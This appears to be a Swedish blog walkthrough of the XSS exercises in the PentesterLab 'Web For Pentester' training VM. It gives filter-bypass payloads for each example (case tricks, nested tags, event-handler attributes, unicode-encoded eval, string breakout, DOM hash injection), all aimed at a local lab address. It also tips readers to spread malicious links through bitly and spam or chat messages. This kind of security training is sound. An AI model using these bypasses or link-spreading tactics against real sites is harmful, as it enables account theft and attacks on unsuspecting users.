---
layout: post
title: PentesterLab - Web For Pentester
date: 2015-12-10 04:07:05.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags: []
meta:
  _publicize_pending: '1'
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '17649752935'
  original_post_id: '640'
  _wp_old_slug: '640'
  _oembed_7f9d0109bc065e3af520a066fe02e09a: "{{unknown}}"
  _oembed_74b42dc54f1038cce5e93248a4615553: "{{unknown}}"
  _oembed_4cc83e58820069a7a005c30f7deae484: "{{unknown}}"
  _oembed_b3eb9f5ab7986428c8d6eaf946d2d149: "{{unknown}}"
  _oembed_0dceb30a5e5877e0ecc8566c4fc5bfa8: "{{unknown}}"
  _oembed_b6eee17f6dc70508a56f6c09fe8bb99a: "{{unknown}}"
  _oembed_518f55097adac6a59b665baddcb32eb1: "{{unknown}}"
  _oembed_7145571e50d86837191c2b2e2d5c1aec: "{{unknown}}"
  _oembed_1219502b81fa938d264f7e84f9d08029: "{{unknown}}"
  _oembed_a6a77992080e5588340fe5fe75362648: "{{unknown}}"
  _oembed_de708edb52ee58ccfacb497ceda3f6d4: "{{unknown}}"
  _oembed_96321c1e9a1c0c67564910813a578dc1: "{{unknown}}"
  _oembed_d29213c18f3edde831313a005cd58cb7: "{{unknown}}"
  _oembed_db49344cc5143108c62da305a5f1718a: "{{unknown}}"
  _oembed_487a666a47431d2ee55d4ab0f054984c: "{{unknown}}"
  _oembed_87547eb26e278d49da8333b9420035fd: "{{unknown}}"
  _oembed_11498d4aeb47e5355016441c13ee956a: "{{unknown}}"
  _oembed_73e55cde50701b7420e96ca659fa1e4d: "{{unknown}}"
  _oembed_3a0a99ead2c1998bd76ac126a387505c: "{{unknown}}"
  _oembed_2ba9178c9e8852edb437201babb1eabd: "{{unknown}}"
  _oembed_8261f68b9a05c68df57b7e284b94bff1: "{{unknown}}"
  _oembed_b48f326bcf1f0704bcab96497b3c6fc6: "{{unknown}}"
  _oembed_783a77ecb8cb3617842371274297badd: "{{unknown}}"
  _oembed_37067755f20ce6ad9bf5f45ab6f9c20a: "{{unknown}}"
  _oembed_e02233e8360a8c1bf719f7083f3df13c: "{{unknown}}"
  _oembed_05a20173b6c43b8aeca2b50359d83e51: "{{unknown}}"
  _oembed_4eecbc93b5f94af4051e54701a1d5fa4: "{{unknown}}"
  _oembed_60538a8d653f2b721a293c92cae28b76: "{{unknown}}"
  _oembed_27edc2309f4e48c6c8837ba1f4268b3f: "{{unknown}}"
  _oembed_3842842a3d7753e7ccbeab3407c08f0b: "{{unknown}}"
  _oembed_83312fe08ad368fd80f98e4f81111d81: "{{unknown}}"
  _oembed_1af79807535e662c0833742b3ceca475: "{{unknown}}"
author:
  login: tidlost
  email: philip.linghammar@protonmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---

# Installera
Så. Först måste du ladda ner VirtualBox. Därefter skapa en ny linuxmaskin, 32bit.
Därefter laddar du ner .iso-filen. Klickas på settings i din maskin, och sedan på storeage, där det är empty lägger du till iso-filen. Sen går du över till nätverk å byter från LAN till Bridged.
Sedan startar du den virtuella maskinen. När den har laddat klart kör du kommandot:
`ifconfig`
Då får du reda på datorns interna ip. Kopiera det å klistra in det i den browser, så kommer sidan upp.

## XSS
Det finns i princip två sorters XSS. **Persistent** och **non-persistent**. Dessa kan även beskrivas som Server och DOM attacker. Non-persistent kallas ibland även för reflected.
Non-persistent: reflected.
Persistent: Server
I persistent så sparas scriptet, eller koden, i serverns databas. Så nästa gång som någon besöker sidan och servern skickar infon från databasen så innehåller den scriptet.
Persistent är självklart inte lika vanligt som non-persistent. Men det är mycket farligare attack.
Det finns även self-propagating.
Non-persistent/reflected.
Som man kan sedan nedan så kan XSS-attacker utföras direkt i adressfältet. Problemet är dock att attacken bara utsätter attackeraren själv som kör skriptet (när hen laddar sidan). Därför måste vi alltså lyckas transportera adressen med scriptet i till en annan användare. Detta kan göras genom url-förkortningar.
Google short blockerar om man försöker lägga in script. Men inte:
https://bitly.com/shorten/
Sedan krävs det vanlig hederlig social engineering. De vanligaste sätten är att skicka länkarna via spam eller via typ chatklienter. Typ skype. Ett annat sätt är att publicera länken på forum eller i kommentarsfält. Då kan man dessutom "gömma" adressen i en a href-tag.
Exempel 1.
Vi kan direkt se att i adressfältet kan man sätta in text som sedan skrivs ut på sidan.

```html
http://192.168.1.101/xss/example1.php?name=hacker
```
Här kan man alltså testa att sätta in ett script för att pröva om det exekivieras.

```html
http://192.168.1.101/xss/example1.php?name=<script>alert("hej")</script>
```
### Exempel 2
Här kan vi notera att om vi testar

```html
http://192.168.1.101/xss/example1.php?name=<script>alert("hej")</script>
```

Så skrivs bara `alert("hej")` ut. Vilket tyder på att något filtrerar bort script-taggarna. Vilket gör att scriptet tolkas som text och inte som kod.
För att komma runt det så kan vi köra den enklaste formen.

```html
http://192.168.1.101/xss/example1.php?name=<Script>alert("hej")</Script>
```

Alltså, vi ändrade så att script stavas med stor bokstav. Den regex filtrering som hade implementeras hade inte tänkt så långt.
### Exempel 3
Den här var lite knivigare. Hela

```javascript
<script>
```

Här nu bortfiltrerad.
Knepet blir därför att köra

```javascript
http://192.168.1.101/xss/example3.php?name=<scri<script>pt>alert("xss")</scri</script>pt>
```

### Exempel 4
Här har script helt å hållet filtrerats bort. Då får vi istället injecta javascript i andra taggar.
andra taggar där man kan göra det är
a
img
```javascript
http://192.168.1.101/xss/example4.php?name=hacker<img src="jj" onerror="alert('hello')"/>
http://192.168.1.101/xss/example4.php?name=hacker%3Ca%20onclick=%22alert(%27hej%27)%22%20href=%22test%22/%3Ehejejej%3C/a%3E
http://192.168.1.101/xss/example4.php?name=hacker<a href="alert("hej");">klicka mig</a>
http://192.168.1.101/xss/example4.php?name=hacker<button%20onclick=%27alert("hello")%27>button</button>
http://192.168.1.101/xss/example4.php?name=hacker%3Cimg%20src=%22ff%22%20onclick=%27alert(%22hej%22)%27%3E
http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmouseup=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E
http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmousedown=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E
```

Här funkar alltså alla javascript functioner men till element som inte innehåller ordet script.

### Exempel 5
I Exempel 5 verkar det som att de tillåter script-taggen igen men nu är det alert som är sanitized. Det är enkelt att komma undan. Om vi vill få upp en pop-up så kan vi antingen köra:

```javascript
http://192.168.1.101/xss/example5.php?name=hacker<script>prompt("hello")</script>
//eller
http://192.168.1.101/xss/example5.php?name=hacker<script>confirm("hello")</script>
//Eller så skriver vi scriptet i unicode-tecken.
http://192.168.1.101/xss/example5.php?name=hacker%3Cscript%3Eeval(%22u0061u006Cu0065u0072u0074u0028u0027u0068u0065u006Cu006Cu006Fu0027u0029%22);%3C/script%3E
```

Scriptet kan alltså skrivas i unicode-format. Eval utför koden oavsett om det är unicode/utf8/hexadecimal.
Om du enkelt vill förvanla utf8-text till unicode kan du använda den här koden:

```javascript
function toUnicode(theString) {
  var unicodeString = '';
  for (var i=0; i < theString.length; i++) {
    var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();
    while (theUnicode.length < 4) {
      theUnicode = '0' + theUnicode;
    }
    theUnicode = '\u' + theUnicode;
    unicodeString += theUnicode;
  }
  return unicodeString;
}
var uni = toUnicode(script);
console.log(uni);
```

### Exempel 6

Här har det skett lite. Om vi kollar i källkoden så ser vi att det vi skickar in blir tolkat som att det är en del av en string som sätts in i en variabel.
För att lösa det behöver vi först avsluta stringen å sedan lägga in vår kod, å sedan kommentera ut efterföljande kod.

```javascript
http://192.168.1.101/xss/example6.php?name=hacker";alert("hello");//
```

### Exempel 7
Här kan vi notera i källkoden att det är ungefär samma problem som Exempel 6. Skillnaden är bara att nu filteras alla `""`. Så vi använder bara `''` istället

```javascript
http://192.168.1.101/xss/example7.php?name=';alert('hello');//
```

### Exempel 8
Om vi klickar runt lite så kan vi se att vi kan injecta saker in i form-taggen. Där kan vi sen injecta vår alert via en onclick.

```javascript
http://192.168.1.101/xss/example8.php/%22onclick=%22alert('hello');
```
### Exempel 9

Den sista var ganska så enkel. koden i källkoden såg ut såhär:

```javascript
<script>
  document.write(location.hash.substring(1));
</script>
```

Vilket betyder att den skriver ut på hemsidan (document.write) vad som finns i adressen efter hash-markören. Alltså efter #
Detta är ett exempel på en DOM-based attack. Hemsidan kan vara statisk men det finns ändå risk genom att man skriver document.write(location.hash)
